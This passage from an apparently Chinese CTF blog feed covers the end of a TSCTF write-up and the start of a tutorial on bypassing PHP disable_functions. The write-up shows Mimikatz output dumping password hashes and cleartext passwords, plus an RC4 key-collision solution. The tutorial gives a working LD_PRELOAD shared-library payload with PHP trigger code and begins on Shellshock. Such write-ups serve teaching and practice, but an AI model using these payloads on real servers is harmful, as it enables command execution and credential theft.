class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada"><span class="hljs-keyword">type</span> <span class="hljs-type">password1.txt</span><br><span class="hljs-type"></span><br><span class="hljs-type">  </span>.#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Sep <span class="hljs-number">18</span> <span class="hljs-number">2020</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">29</span><br> .## ^ ##.  <span class="hljs-string">&quot;A La Vie, A L&#x27;Amour&quot;</span> - (oe.eo)<br> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz<br> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz(commandline) # privilege::debug<br>Privilege &#x27;<span class="hljs-number">20</span>&#x27; OK<br><br>mimikatz(commandline) # sekurlsa::logonpasswords<br><br>Authentication Id : 0 ; <span class="hljs-number">666554</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000</span>a2bba)<br>Session           : <span class="hljs-type">Interactive</span> from <span class="hljs-number">1</span><br>User Name         : 23333<br>Domain            : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Server      : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Time        : 2021/5/3 16:11:10<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1594512008</span>-<span class="hljs-number">2047613387</span>-<span class="hljs-number">837257493</span>-<span class="hljs-number">1000</span><br>msv :<br> [<span class="hljs-number">00000003</span>] Primary<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * LM       : 5<span class="hljs-type">c651cac55ccdc3cd210ce269f6f8d13</span><br> * NTLM     : 922<span class="hljs-type">ce1a39b00c1d9d929dfd31d9f2c1f</span><br> * SHA1     : 7<span class="hljs-type">a6fdaedc33598705c1690da021bb69d0aaef9c0</span><br>tspkg :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>wdigest :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>kerberos :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">666412</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000</span>a2b2c)<br>Session           : <span class="hljs-type">Interactive</span> from <span class="hljs-number">1</span><br>User Name         : 23333<br>Domain            : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Server      : <span class="hljs-type">WIN</span>-OVTH665JQC3<br>Logon Time        : 2021/5/3 16:11:10<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1594512008</span>-<span class="hljs-number">2047613387</span>-<span class="hljs-number">837257493</span>-<span class="hljs-number">1000</span><br>msv :<br> [<span class="hljs-number">00000003</span>] Primary<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * LM       : 5<span class="hljs-type">c651cac55ccdc3cd210ce269f6f8d13</span><br> * NTLM     : 922<span class="hljs-type">ce1a39b00c1d9d929dfd31d9f2c1f</span><br> * SHA1     : 7<span class="hljs-type">a6fdaedc33598705c1690da021bb69d0aaef9c0</span><br>tspkg :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>wdigest :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>kerberos :<br> * Username : 23333<br> * Domain   : <span class="hljs-type">WIN</span>-OVTH665JQC3<br> * Password : <span class="hljs-type">EL_PSY_CONGROO</span><br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">997</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e5</span>)<br>Session           : <span class="hljs-type">Service</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">LOCAL</span> SERVICE<br>Domain            : <span class="hljs-type">NT</span> AUTHORITY<br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:57<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">19</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Domain   : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Domain   : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">996</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e4</span>)<br>Session           : <span class="hljs-type">Service</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br>Domain            : <span class="hljs-type">WORKGROUP</span><br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:57<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">20</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : <span class="hljs-type">win</span>-ovth665jqc3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">48274</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0000</span>bc92)<br>Session           : <span class="hljs-type">UndefinedLogonType</span> from <span class="hljs-number">0</span><br>User Name         : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Domain            : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:56<br>SID               : <br>msv :<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; <span class="hljs-number">999</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">000003e7</span>)<br>Session           : <span class="hljs-type">UndefinedLogonType</span> from <span class="hljs-number">0</span><br>User Name         : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br>Domain            : <span class="hljs-type">WORKGROUP</span><br>Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>Logon Time        : 2021/5/3 16:10:56<br>SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span><br>msv :<br>tspkg :<br>wdigest :<br> * Username : <span class="hljs-type">WIN</span>-OVTH665JQC3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>kerberos :<br> * Username : <span class="hljs-type">win</span>-ovth665jqc3$<br> * Domain   : <span class="hljs-type">WORKGROUP</span><br> * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)<br>ssp :<br>credman :<br><br>mimikatz(commandline) # <span class="hljs-keyword">exit</span><br>Bye!<br><br>C:\phpstudy_pro\WWW\TEST\hackable\uploads&gt;<br></code></pre></div></td></tr></table></figure><p>第二个流量包位置忘记了，解密后的内容如下</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">23333</span> HACKING_TO_THE_GATE<br>命令成功完成。<br></code></pre></div></td></tr></table></figure><p>由此可得出flag:TSCTF{EL_PSY_CONGROO_HACKING_TO_THE_GATE}</p><h3 id="HelloRc4"><a href="#HelloRc4" class="headerlink" title="HelloRc4"></a>HelloRc4</h3><p>这题看懂了源码就着实很简单。分析一下源码可以知道。先进行了一个sha256验证，直接拿脚本跑就行了，然后进入到MyPrng类中在下面这个代码，</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyPrng</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span> <span class="hljs-comment">#创建临时向量T（256位）</span><br>        self.state  = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>        self.i      = <span class="hljs-number">0</span><br>        self.j      = <span class="hljs-number">0</span><br>        self.k      = <span class="hljs-number">0</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__swap_state</span>(<span class="hljs-params">self, a, b</span>):</span><br>        self.state[a], self.state[b] = self.state[b], self.state[a]  <span class="hljs-comment">#每产生一个字节k，S的元素都要被再次排列</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ksa</span>(<span class="hljs-params">self, key</span>):</span><br>        j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            j = (j + self.state[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>            <span class="hljs-built_in">list</span>.append([i,j])<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>                <span class="hljs-keyword">if</span>(p[<span class="hljs-number">0</span>]==j <span class="hljs-keyword">and</span> p[<span class="hljs-number">1</span>]==i):<br>                    <span class="hljs-built_in">print</span>(p[<span class="hljs-number">0</span>],p[<span class="hljs-number">1</span>],i,j,<span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]))<br>            self.__swap_state(i, j) <span class="hljs-comment">#交换元素</span><br>        k = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            k = (k - self.state[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>            self.__swap_state(i, k) <span class="hljs-comment">#交换元素</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">prng</span>(<span class="hljs-params">self</span>):</span>  <span class="hljs-comment">#产生密钥字节k</span><br>        self.i = (self.i + <span class="hljs-number">1</span>)                   % <span class="hljs-number">256</span><br>        self.j = (self.j + self.state[self.i])  % <span class="hljs-number">256</span><br>        self.k = (self.k + self.state[self.j])  % <span class="hljs-number">256</span><br>        self.__swap_state(self.i, self.j)<br>        self.__swap_state(self.i, self.k)<br><br>        <span class="hljs-keyword">return</span> self.state[(self.state[self.i] + self.state[self.j] + self.state[self.k]) % <span class="hljs-number">256</span>]<br><br></code></pre></div></td></tr></table></figure><p>我增加了一些注释，再百度一下Rc4原理其实就能看懂。之后看main函数可以发现要求输入key1和key2两个初始密钥，之后利用密钥对同一个明文进行加密，如果两个加密后的密文相同即可输出flag，首先看看key的作用在哪。可以发现key的作用很单一。<br><img src="https://img-blog.csdnimg.cn/2021052413463085.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以只需要两个key加密中ord出来的值一样就行了，到这就很简单了，直接构造如下，两个key长度不一样就行了，这样不管怎么样key[]数组取出来的永远是相同字母。</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">key1</span> = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br><span class="hljs-attr">key2</span> = aaaaaaaaaaaaaaaaa<br></code></pre></div></td></tr></table></figure><p>直接输拿flag<br><img src="https://img-blog.csdnimg.cn/20210524135057598.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>TSCTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于disabled_function的绕过</title>
    <link href="/2021/05/17/2021-5-17-%E5%85%B3%E4%BA%8Edisabled_function%E7%9A%84%E7%BB%95%E8%BF%87/"/>
    <url>/2021/05/17/2021-5-17-%E5%85%B3%E4%BA%8Edisabled_function%E7%9A%84%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<p>最近做题遇到关于disabled_function的绕过，有时间来总结一下，博客顺序大致是按照ctfhub上的web进阶中关于disabled_fuction模块的学习顺序。</p><h3 id="绕过方式分类-大部分都可以用蚁剑插件直接进行，这里主要讲讲原理"><a href="#绕过方式分类-大部分都可以用蚁剑插件直接进行，这里主要讲讲原理" class="headerlink" title="绕过方式分类(大部分都可以用蚁剑插件直接进行，这里主要讲讲原理)"></a>绕过方式分类(大部分都可以用蚁剑插件直接进行，这里主要讲讲原理)</h3><h5 id="LD-PRELOAD利用-so文件环境变量加载指定的动态链接库，从而达到命令执行的目的"><a href="#LD-PRELOAD利用-so文件环境变量加载指定的动态链接库，从而达到命令执行的目的" class="headerlink" title="- LD_PRELOAD利用.so文件环境变量加载指定的动态链接库，从而达到命令执行的目的"></a>- LD_PRELOAD利用.so文件环境变量加载指定的动态链接库，从而达到命令执行的目的</h5><h5 id="CVE-2014-6271-Shellshock漏洞-bypass-disable-functions"><a href="#CVE-2014-6271-Shellshock漏洞-bypass-disable-functions" class="headerlink" title="- CVE-2014-6271 Shellshock漏洞 bypass disable_functions"></a>- CVE-2014-6271 Shellshock漏洞 bypass disable_functions</h5><h5 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="- Apache Mod CGI"></a>- Apache Mod CGI</h5><h5 id="攻击PHP-FPM绕过disable-funciton"><a href="#攻击PHP-FPM绕过disable-funciton" class="headerlink" title="- 攻击PHP_FPM绕过disable funciton"></a>- 攻击PHP_FPM绕过disable funciton</h5><h5 id="寻找未禁用的漏网函数，常见的执行命令的函数有-system-、exec-、shell-exec-、passthru-，偏僻的-popen-、proc-open-、pcntl-exec"><a href="#寻找未禁用的漏网函数，常见的执行命令的函数有-system-、exec-、shell-exec-、passthru-，偏僻的-popen-、proc-open-、pcntl-exec" class="headerlink" title="- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()"></a>- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()</h5><h5 id="UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等"><a href="#UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等" class="headerlink" title="- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等"></a>- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等</h5><h5 id="COM组件-条件：Windows、php5-x、支持COM组件"><a href="#COM组件-条件：Windows、php5-x、支持COM组件" class="headerlink" title="- COM组件 条件：Windows、php5.x、支持COM组件"></a>- COM组件 条件：Windows、php5.x、支持COM组件</h5><h5 id="FFI扩展"><a href="#FFI扩展" class="headerlink" title="- FFI扩展"></a>- FFI扩展</h5><h5 id="iconv绕过"><a href="#iconv绕过" class="headerlink" title="- iconv绕过"></a>- iconv绕过</h5><h2 id="关于LD-PRELOAD"><a href="#关于LD-PRELOAD" class="headerlink" title="关于LD_PRELOAD"></a>关于LD_PRELOAD</h2><p>在学习LD_PRELOAD之前需要了解什么是链接。</p><p>程序的链接主要有以下三种：</p><p>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。</p><p>运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</p><p>对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致disable_function被绕过。</p><h4 id="LD-PRELOAD的介绍"><a href="#LD-PRELOAD的介绍" class="headerlink" title="LD_PRELOAD的介绍"></a>LD_PRELOAD的介绍</h4><blockquote><p>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p></blockquote><h4 id="对LD-PRELOAD的利用"><a href="#对LD-PRELOAD的利用" class="headerlink" title="对LD_PRELOAD的利用"></a>对LD_PRELOAD的利用</h4><blockquote><p>前提： 能够上传.so文件到服务器后台，能够用putenv()等函数控制相应的环境变量，存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载LD_PRELOAD中的.so文件），比如mail()、imap_mail()、mb_send_mail()和error_log()等。<br>首先，我们能够上传恶意.so文件，.so文件由攻击者在本地使用与服务端相近的系统环境进行编译，该库中重写了相关系统函数，重写的系统函数能够被PHP中未被disable_functions禁止的函数所调用。</p></blockquote><p>当我们能够设置环境变量，比如putenv函数未被禁止，我们就可以把LD_PRELOAD变量设置为恶意.so文件的路径，只要启动新的进程就会在新进程运行前优先加载该恶意.so文件，由此，恶意代码就被注入到程序中</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;touch /var/www/html/success&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seteuid</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>payload();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果想创建一个动态链接库，可以使用 GCC 的-shared选项。输入文件可以是源文件、汇编文件或者目标文件。另外还得结合-fPIC选项。-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。你要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p><figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">gcc -shared -fPIC <span class="hljs-keyword">test</span>.c -o test_x64.<span class="hljs-keyword">so</span><br></code></pre></div></td></tr></table></figure><p>使用该命令将.c文件编译成动态链接库.文件，并上传到/tmp上。</p><p>其实这里也有其他很多种代码，这里有一个通用化的代码。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，比如geteuid（）。</p><p>在GCC 有个 C 语言扩展修饰符__attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行__attribute__((constructor))修饰的函数。</p><p><strong>attribute</strong>((destructor))中的destructor参数让系统在main()函数退出或者调用了exit()之后,(被__attribute__((destructor))修饰的函数)</p><p>因此，只要php中设置了LD_PRELOAD，并派生了新的进程，将会执行LD_PRELOAD的文件中<br><strong>attribute</strong>((constructor))里的函数</p><p>test3.c</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br>__attribute__((constructor))<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmd = getenv(<span class="hljs-string">&quot;CMD&quot;</span>);<br>system(cmd);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>test2.php</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;CMD=ls&quot;</span>);<br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=./test3_x64.so&quot;</span>);<br>error_log(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/html/test_x64.so&quot;</span>);<br>mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>将php代码上传到/var/www/html/1.php，接着访问1.php，查看/var/www/html会新建一个success文件。由此即可达到绕过disable_function<br>参考文章<br><a href="_url"></a><a href="http://www.52bug.cn/hkjs/6888.html">http://www.52bug.cn/hkjs/6888.html</a></p><h2 id="CVE-2014-6271-Shellshock漏洞-bypass-disable-functions（bash版本小于4-1）"><a href="#CVE-2014-6271-Shellshock漏洞-bypass-disable-functions（bash版本小于4-1）" class="headerlink" title="CVE-2014-6271 Shellshock漏洞 bypass disable_functions（bash版本小于4.1）"></a>CVE-2014-6271 Shellshock漏洞 bypass disable_functions（bash版本小于4.1）</h2><h4 id="介绍Shellshock漏洞"><a href="#介绍Shellshock漏洞" class="headerlink" title="介绍Shellshock漏洞"></a>介绍Shellshock漏洞</h4><blockquote><p>什么是SHELLSHOCK漏洞<br>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。<br>在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。<br>简单来说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。</p></blockquote><h4 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h4><p>我们先来看一下这个漏洞形成的原因。这个问题的发生是因为Bash的一个功能，它允许在Bash的shell中使用环境变量来定义函数。<br>函数的作用是把经常调用的代码封装起来，然后在其他地方调用，所有的大多数脚本语言都有这个功能。<br>Bash中函数的定义是这样的:</p><figure class="highlight txt"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span 